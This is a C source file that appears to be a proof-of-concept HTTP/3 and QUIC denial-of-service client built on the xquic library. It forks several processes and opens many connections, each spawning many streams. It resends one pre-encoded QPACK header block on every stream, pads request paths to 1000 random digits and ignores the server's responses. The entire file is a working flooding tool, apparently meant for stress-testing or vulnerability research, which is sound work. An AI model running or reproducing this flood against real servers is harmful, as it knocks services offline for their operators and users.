/**
 * @copyright Copyright (c) 2022, Alibaba Group Holding Limited
 */
#include "src/http3/xqc_h3_request.h"
#include "client_common.h" 
#include "test_h3_client.h"
#include "poc_common.h"

extern int g_conn_timeout;

extern xqc_conn_settings_t *g_conn_settings;

extern int g_conn_count;
extern int g_transport;

int
client_ddos_request_construct_header_data(xqc_h3_request_t *h3_request, user_stream_t *user_stream, user_conn_t *user_conn)
{
    int ret = 0;

    xqc_http_headers_t headers_in;
    memset(&headers_in, 0, sizeof(headers_in));

    ret = poc_h3_request_format_headers(h3_request, &headers_in, &user_stream->http_header, 1);

    if (ret < 0) {
        printf("error format headers, ret = %d\n", ret);
        return XQC_ERROR;
    }
    size_t buf_size = xqc_max(XQC_VAR_BUF_INIT_SIZE, headers_in.total_len);   /* larger is better */
    xqc_var_buf_t *data = xqc_var_buf_create(buf_size);
    if (data == NULL) {
        printf("error create buf\n");
        return XQC_ERROR;
    }

    ret = poc_h3_request_header_qpack_encoder(h3_request->h3_stream, &headers_in, data);
    if (ret < 0) {
        printf("error qpack encoder header");
        return XQC_ERROR;
    }

    user_conn->ext_data = (void *)data;

    return XQC_OK;
}


int
client_ddos_request_send(xqc_h3_request_t *h3_request, user_stream_t *user_stream)
{
    ssize_t ret = 0;
    int header_only = 1;

    user_conn_t * user_conn = user_stream->user_conn;
    ret = xqc_h3_request_send_headers(h3_request, &user_stream->http_header, header_only);
    if (ret < 0) {
        printf("xqc_h3_request_send_headers error %zd\n", ret);
        return ret;
    } else {
        //printf("xqc_h3_request_send_headers success size=%zd\n", ret);
        user_stream->header_sent = 1;
    }

    g_user_stats.send_request_count++;
    if (header_only) {
        user_conn->send_request_count++;
        return 0;
    }

    int fin = 1; //request send fin
    while(user_stream->send_offset < user_stream->send_body_len) {
        ret = xqc_h3_request_send_body(h3_request, user_stream->send_body + user_stream->send_offset, user_stream->send_body_len - user_stream->send_offset, fin);
        if (ret == -XQC_EAGAIN) {
            return 0;
        } else if (ret < 0) {
            printf("xqc_h3_request_send_body error %zd\n", ret);
            return ret;
        } else if(ret == 0){
            break;
        }else {
            user_stream->send_offset += ret;
        }
    }

    if(user_stream->send_offset == user_stream->send_body_len){
        g_user_stats.send_request_count++;
        user_conn->send_request_count++;
    }
    return 0;
}


int
client_ddos_request_read_notify(xqc_h3_request_t *h3_request, xqc_request_notify_flag_t flag, void *user_data)
{
    return 0; 
    int ret;
    unsigned char fin = 0, recv_finish = 0;
    user_stream_t *user_stream = (user_stream_t *) user_data;
    user_conn_t *user_conn = user_stream->user_conn;
    if ((flag & XQC_REQ_NOTIFY_READ_HEADER) || (flag & XQC_REQ_NOTIFY_READ_TRAILER)) {
        xqc_http_headers_t *headers;
        headers = xqc_h3_request_recv_headers(h3_request, &fin);
        if (headers == NULL) {
            printf("xqc_h3_request_recv_headers error\n");
            return -1;
        }
        if (g_debug_flag) {
            for (int i = 0; i < headers->count; i++) {
                printf("%s = %s\n",(char*)headers->headers[i].name.iov_base, (char*)headers->headers[i].value.iov_base);
            }
        }
        user_stream->header_recvd = 1;

        if (fin) {
            /* 只有header，请求接收完成，处理业务逻辑 */
            g_user_stats.recv_response_count++;
            user_conn->recv_response_count++;
            recv_finish = 1;
            goto end;
        }
        //继续收body
    }

    if (!(flag & XQC_REQ_NOTIFY_READ_BODY)) {
        return 0;
    }

    char buff[4096] = {0};
    size_t buff_size = 4096;
    ssize_t read;
    ssize_t read_sum = 0;
    fin = 0;
    do {
        read = xqc_h3_request_recv_body(h3_request, buff, buff_size, &fin);
        if (read == -XQC_EAGAIN) {
            break;
        } else if (read < 0) {
            printf("xqc_h3_request_recv_body error %zd\n", read);
            return read;
        }

        //poc_hex_print(buff, read);

        read_sum += read;
        user_stream->recv_body_len += read;

    } while (read > 0 && !fin);


    if (flag & XQC_REQ_NOTIFY_READ_EMPTY_FIN) {
        fin = 1;
        printf("h3 fin only received\n");
    }


    if(fin) {
        g_user_stats.recv_response_count++;
        user_conn->recv_response_count++;
        recv_finish = 1;
        goto end;
    }
end:
    return 0;
}


void
client_ddos_create_req_callback(int fd, short what, void *arg)
{
    user_conn_t *user_conn = (user_conn_t *)arg;
    if (user_conn->total_stream_num < g_stream_num_per_conn) {
        int i = 0;
        for (i = 0; i < g_req_per_time; i++) {
            user_stream_t * user_stream = client_create_user_stream(user_conn->ctx->engine, user_conn, &user_conn->cid); 
            if (user_stream == NULL) {
                printf("error create user_stream\n");
                return;
            }
            if (i == 0) {
                client_ddos_request_send(user_stream->h3_request, user_stream);
                client_ddos_request_construct_header_data(user_stream->h3_request, user_stream, user_conn); 
            } else {
                if (poc_h3_request_send_headers_raw_data(user_stream->h3_request->h3_stream,
                    (xqc_var_buf_t *)user_conn->ext_data, 1) <= 0)
                {
                    printf("send headers raw data error\n");
                }
            }
            user_conn->cur_stream_num++;
            user_conn->total_stream_num++;
            if (user_conn->total_stream_num >= g_stream_num_per_conn) {
                break;
            }
        } 
    }
    if (user_conn->total_stream_num < g_stream_num_per_conn) {
        struct timeval tv;
        tv.tv_sec = g_req_intval/1000;
        tv.tv_usec = (g_req_intval%1000)*1000;
        event_add(user_conn->ev_req, &tv);  
    }
}



void
client_ddos_read_handler(user_conn_t *user_conn, int fd)
{
    xqc_int_t ret;
    ssize_t recv_size = 0;
    ssize_t recv_sum = 0;

    client_ctx_t *p_ctx;
    p_ctx = user_conn->ctx;
    unsigned char packet_buf[XQC_PACKET_TMP_BUF_LEN];

    static ssize_t last_rcv_sum = 0;
    static ssize_t rcv_sum = 0;

    do {
        recv_size = recvfrom(fd,
                             packet_buf, sizeof(packet_buf), 0, 
                             user_conn->peer_addr, &user_conn->peer_addrlen);
        if (recv_size < 0 && errno == EAGAIN) {
            break;
        }

        if (recv_size < 0) {
            printf("recvfrom: recvmsg = %zd(%s)\n", recv_size, strerror(errno));
            break;
        }

        /* if recv_size is 0, break while loop, */
        if (recv_size == 0) {
            break;
        }

        recv_sum += recv_size;
        rcv_sum += recv_size;

        if (user_conn->get_local_addr == 0) {
            user_conn->get_local_addr = 1;
            socklen_t tmp = sizeof(struct sockaddr_in6);
            int ret = getsockname(user_conn->fd, (struct sockaddr *) user_conn->local_addr, &tmp);
            if (ret < 0) {
                printf("getsockname error, errno: %d\n", errno);
                break;
            }
            user_conn->local_addrlen = tmp;
        }

        uint64_t recv_time = now();
        
        //if (user_conn->ext_data == NULL) {
            ret = xqc_engine_packet_process(p_ctx->engine, packet_buf, recv_size,
                    user_conn->local_addr, user_conn->local_addrlen,
                    user_conn->peer_addr, user_conn->peer_addrlen,
                    (xqc_msec_t)recv_time, user_conn);
            if (ret != XQC_OK) {
                printf("xqc_client_read_handler: packet process err, ret: %d\n", ret);
                return;
            }
        //}

        if (recv_size > 0) {
            g_user_stats.recv_bytes_count += recv_size;
        }
    } while (recv_size > 0);

    xqc_engine_finish_recv(p_ctx->engine);
    return;
}

/* write and read 的实际action，linux系统就是调用read和write接口 */
void
client_ddos_event_callback(int fd, short what, void *arg)
{
    //DEBUG;
    user_conn_t *user_conn = (user_conn_t *) arg;

    if (what & EV_WRITE) {
        client_socket_write_handler(user_conn);

    } else if (what & EV_READ) {
        client_ddos_read_handler(user_conn, fd);

    } else {
        printf("event callback: what=%d\n", what);
        exit(1);
    }
}



user_conn_t * 
client_ddos_user_conn_create(client_ctx_t *ctx, const char *server_addr, int server_port,
    int transport)
{
    user_conn_t *user_conn = calloc(1, sizeof(user_conn_t));
    /* use HTTP3? */
    user_conn->h3 = transport;
    user_conn->ctx = ctx;

    user_conn->ev_timeout = event_new(ctx->eb, -1, 0, client_timeout_callback, user_conn);
    
    /* set connection timeout */
    struct timeval tv;
    g_conn_timeout = 20;
    tv.tv_sec = g_conn_timeout;
    tv.tv_usec = 0;
    event_add(user_conn->ev_timeout, &tv);

    int ip_type = AF_INET; /* 暂时不支持ipv6 */
    client_init_addr(user_conn, server_addr, server_port);
                                      
    user_conn->fd = client_create_socket(ip_type, 
            user_conn->peer_addr, user_conn->peer_addrlen, NULL);
    if (user_conn->fd < 0) {
        printf("xqc_create_socket error\n");
        return NULL;
    }
    user_conn->ev_socket = event_new(ctx->eb, user_conn->fd, EV_READ | EV_PERSIST, 
                                     client_ddos_event_callback, user_conn);
    event_add(user_conn->ev_socket, NULL);

    return user_conn;
}




static void
client_ddos_create_conn_callback(int fd, short what, void *arg)
{
    client_ctx_t *ctx = (client_ctx_t *)arg;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = (1000000/(g_conn_num));
    event_add(ctx->ev_conc, &tv);

    xqc_h3_callbacks_t h3_cbs = {
        .h3c_cbs = {
            .h3_conn_create_notify = client_test_h3_conn_create_notify,
            .h3_conn_close_notify = client_test_h3_conn_close_notify,
            .h3_conn_handshake_finished = client_test_h3_conn_handshake_finished,
            .h3_conn_ping_acked = client_test_h3_conn_ping_acked_notify,
        },
        .h3r_cbs = {
            .h3_request_close_notify = client_test_request_close_notify,
            .h3_request_read_notify = client_ddos_request_read_notify,
            .h3_request_write_notify = client_test_request_write_notify,
            .h3_request_closing_notify = client_test_request_closing_notify,
        }
    };

    int ret = xqc_h3_ctx_init(ctx->engine, &h3_cbs);
    if (ret != XQC_OK) {
        printf("init h3 context error, ret:%d\n", ret);
        exit(-1);
    }

    /* register transport callbacks */
    xqc_app_proto_callbacks_t ap_cbs = {
        .conn_cbs = {
            .conn_create_notify = client_test_conn_create_notify,
            .conn_close_notify = client_test_conn_close_notify,
            .conn_handshake_finished = client_test_conn_handshake_finished,
            .conn_ping_acked = client_test_conn_ping_acked_notify,
        },
        .stream_cbs = {
            .stream_write_notify = client_test_stream_write_notify,
            .stream_read_notify = client_test_stream_read_notify,
            .stream_close_notify = client_test_stream_close_notify,
        }
    };

    xqc_engine_register_alpn(ctx->engine, XQC_ALPN_TRANSPORT, 9, &ap_cbs);


    xqc_conn_ssl_config_t conn_ssl_config;
    memset(&conn_ssl_config, 0, sizeof(conn_ssl_config));

    conn_ssl_config.session_ticket_data = NULL;
    conn_ssl_config.transport_parameter_data = NULL;

    if (g_conn_count < g_max_conn_num) {
        event_add(ctx->ev_conc, &tv);
        user_conn_t *user_conn = client_ddos_user_conn_create(ctx, g_server_addr, g_server_port, g_transport);
        
        if (user_conn == NULL) {
            printf("client_ddos_user_conn_create error\n");
            return;
        }

        const xqc_cid_t *cid;
        if (user_conn->h3 == 0) {
            cid = xqc_h3_connect(ctx->engine, g_conn_settings, user_conn->token, user_conn->token_len,
                             g_host, g_no_crypto_flag, &conn_ssl_config, user_conn->peer_addr, 
                             user_conn->peer_addrlen, user_conn);
        } else if (user_conn->h3 == 2) {
            cid = xqc_connect(ctx->engine, g_conn_settings, user_conn->token, user_conn->token_len,
                             g_host, g_no_crypto_flag, &conn_ssl_config, user_conn->peer_addr, 
                             user_conn->peer_addrlen, XQC_DEFINED_ALPN_H3_EXT, user_conn);
        } else {
            cid = xqc_connect(ctx->engine, g_conn_settings, user_conn->token, user_conn->token_len,
                          g_host, g_no_crypto_flag, &conn_ssl_config, user_conn->peer_addr, 
                          user_conn->peer_addrlen, XQC_ALPN_TRANSPORT, user_conn);

        }

        if (cid == NULL) {
            printf("xqc_connect error\n");
            return;
        }

        g_conn_count++;
        ctx->cur_conn_num++;
        g_user_stats.conc_conn_count++;
        g_user_stats.total_conn_count++;


        memcpy(&user_conn->cid, cid, sizeof(*cid));
        user_conn->ctx = ctx;
        user_conn->ev_req = event_new(ctx->eb, -1, 0, client_ddos_create_req_callback, user_conn); 
        
        struct timeval tv;
        tv.tv_sec = g_req_intval/1000;
        tv.tv_usec = (g_req_intval%1000)*1000;
        event_add(user_conn->ev_req, &tv);  
    }
    return;
}




client_ctx_t *
client_ddos_create_ctx(xqc_engine_ssl_config_t *engine_ssl_config,
    xqc_transport_callbacks_t *tcbs, xqc_config_t *config)
{
    client_ctx_t * ctx = malloc(sizeof(client_ctx_t));
    memset(ctx, 0, sizeof(client_ctx_t));

    client_open_keylog_file(ctx);
    client_open_log_file(ctx);
    
    xqc_engine_callback_t callback = {
        .set_event_timer = client_set_event_timer, /* call xqc_engine_main_logic when the timer expires */
        .log_callbacks = {
            .xqc_log_write_err = client_write_log,
            .xqc_log_write_stat = client_write_log,
        },
        .keylog_cb = client_keylog_cb,
        .cid_generate_cb = NULL, /* 设置cid */
    };


    ctx->eb = event_base_new();

    if(ctx->eb == NULL){
        return NULL;
    }
    ctx->ev_engine = event_new(ctx->eb, -1, 0, client_engine_callback, ctx);
    if(ctx->ev_engine == NULL){
        return NULL;
    }
    ctx->ev_conc = event_new(ctx->eb, -1, 0, client_ddos_create_conn_callback, ctx);
    if(ctx->ev_conc == NULL){
        return NULL;
    }
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    event_add(ctx->ev_conc, &tv);

    ctx->engine = xqc_engine_create(XQC_ENGINE_CLIENT, config, engine_ssl_config, &callback, tcbs, ctx);

    if(ctx->engine == NULL){
        return NULL;
    }
    return ctx;
}

char g_random_char[] = "1234567890";

int
client_ddos_fill_path(xqc_http_header_t *header_array, int header_cnt, size_t path_size)
{
    int i = 0, j = 0;
    for (i = 0; i < header_cnt; i++) {
        if ((header_array[i].name.iov_len == 5) &&
                strncmp(":path", header_array[i].name.iov_base, 5) == 0)
        {
            if (header_array[i].value.iov_len < path_size) {
                char *buf = (char *)malloc(path_size);
                memcpy(buf, header_array[i].value.iov_base, header_array[i].value.iov_len);
                for (j = header_array[i].value.iov_len; j < path_size; j++) {
                    
                    buf[j] = g_random_char[rand()%(sizeof(g_random_char) - 1)];
                }
                header_array[i].value.iov_base = buf;
                header_array[i].value.iov_len = path_size;
            }        
            break;
        }

    }
    return 0;
}

int
main(int argc, char *argv[])
{
    int rc;
    memset(g_server_addr, 0, sizeof(g_server_addr));
    strncpy(g_server_addr, TEST_SERVER_ADDR , sizeof(g_server_addr) - 1);
    g_server_port = TEST_SERVER_PORT;

    if(client_parse_args(argc, argv, NULL, "") < 0){
        printf("parse arg error\n");
        return -1;
    }

    memset(&g_user_stats, 0, sizeof(user_stats_t));

    g_stats_fp = fopen("b_stats", "wb");


    g_session_len = client_read_file_data(g_session_ticket_data, sizeof(g_session_ticket_data), "test_session");
    g_tp_len = client_read_file_data(g_tp_data, sizeof(g_tp_data), "tp_localhost");

    g_token_len = client_read_token(g_token, sizeof(g_token));
    if (g_token_len < 0) {
        g_token_len = 0;
    }


    char header_buf[4096];
    if (strlen(g_header_file) > 0) {
        g_header_cnt = client_read_http_headers_from_file(
                g_headers, MAX_HEADER_SIZE, g_header_file,
                header_buf, sizeof(header_buf));
        if (g_header_cnt < 0) {
            printf("read header from file error\n");
            return -1;
        }   
    } else {
        if (client_fill_default_headers(g_headers, MAX_HEADER_SIZE, &g_header_cnt) < 0) {
            printf("fill default headers error\n");
            return -1;
        }
        client_ddos_fill_path(g_headers, g_header_cnt, 1000);
    }

    int i = 0;

    for(i = 0; i < MAX_PROCESS_NUM; i++){
        g_process_count_array[i] = 0;
    }

    pid_t pid;
    for(i = 1; i < g_process_num; i++){
        pid = fork();
        if(pid < 0){
            printf("error create process, current process num:%d, need create process:%d\n", i, g_process_num);
        }else if(pid == 0){
            printf("Current Pid = %d , Parent Pid = %d\n", getpid(), getppid());
            break;
        }else{
            sleep(1);
        }
    }

    xqc_engine_ssl_config_t  engine_ssl_config;
    memset(&engine_ssl_config, 0, sizeof(engine_ssl_config));
    /* client does not need to fill in private_key_file & cert_file */
    engine_ssl_config.ciphers = XQC_TLS_CIPHERS;
    engine_ssl_config.groups = XQC_TLS_GROUPS;

    xqc_transport_callbacks_t tcbs = {
        .write_socket = client_write_socket,
        .write_socket_ex = NULL,
        .save_token = client_save_token,
        .save_session_cb = client_save_session_cb,
        .save_tp_cb = client_save_tp_cb,
        .cert_verify_cb = client_cert_verify,
        .conn_update_cid_notify = client_conn_update_cid_notify,
        .ready_to_create_path_notify = NULL,
        .path_removed_notify = NULL,
        .conn_closing = client_conn_closing_notify,
    };

    xqc_config_t config;
    if (xqc_engine_get_default_config(&config, XQC_ENGINE_CLIENT) < 0) {
        return -1;
    }
    config.cid_len = DEFAULT_CID_LEN; /* 设置默认cid的长度 */
    xqc_cong_ctrl_callback_t cong_ctrl;
    cong_ctrl = xqc_bbr_cb;

    xqc_conn_settings_t conn_settings = {
        .pacing_on  =   0,
        .ping_on    =   0,
        .cong_ctrl_callback = cong_ctrl,
        .cc_params  =   {
            .customize_on = 1, 
            .init_cwnd = 32, 
            .cc_optimization_flags = 0, 
            .copa_delta_ai_unit = 0, 
            .copa_delta_base = 0,
        },
        .spurious_loss_detect_on = 0,
        .keyupdate_pkt_threshold = 0,
        .max_datagram_frame_size = 0,
        .enable_multipath = 0,
        .marking_reinjection = 1,
        .mp_ping_on = 0,
    };
    conn_settings.proto_version = XQC_VERSION_V1;
    g_conn_settings = &conn_settings;

    client_ctx_t * ctx = NULL;
    ctx = client_ddos_create_ctx(&engine_ssl_config, &tcbs, &config);
    if(ctx == NULL){
        printf("ctx create error\n");
        exit(0);
    }

    pthread_t id;
    int ret = pthread_create(&id, NULL, (void *)client_print_stat_thread, NULL);
    if(ret != 0){
        printf ("Create pthread error!\n");
        exit(0);
    }

    event_base_dispatch(ctx->eb);
}

